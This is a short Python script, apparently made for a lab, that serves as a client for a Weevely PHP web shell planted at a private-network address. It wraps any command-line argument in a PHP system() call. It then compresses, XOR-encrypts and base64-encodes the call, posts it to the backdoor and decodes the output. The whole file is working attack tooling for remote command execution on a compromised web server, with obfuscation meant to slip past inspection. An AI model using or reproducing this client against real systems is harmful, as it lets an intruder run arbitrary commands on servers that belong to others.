#!/usr/bin/python3


import base64
import re
import signal
import sys
import zlib

import requests


def def_handler(sig, frame):
    print(f"[!] Saliendo .....")
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


def send(command):
    mainurl = "http://192.168.56.2/weevely.php7"
    header = {
        "Host": "192.168.56.2",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
    }
    r = requests.post(url=mainurl, headers=header, data=command)

    if r.text:
        return r.text
    else:
        return ""


def encodeDecode(command):
    key = b"3ddf0d5c"
    output = bytearray()
    c = len(key)

    for i in range(len(command)):
        output.append(command[i] ^ key[i % c])

    return bytes(output)


def main():
    command = f"system('{sys.argv[1]}');".encode("utf-8")
    command = zlib.compress(command)
    command = encodeDecode(command)
    command = base64.b64encode(command)
    command = f"b6e7a529b6c2{command.decode('utf-8')}d598a771749b"
    response = send(command)

    filter_response = re.findall(
        r"afnqDsRcBpVmU71yb6e7a529b6c2(.*?)d598a771749b", response
    )

    response = base64.b64decode(filter_response[0])
    response = encodeDecode(response)
    response = zlib.decompress(response)
    print(response.decode("utf-8"))


if __name__ == "__main__":
    main()
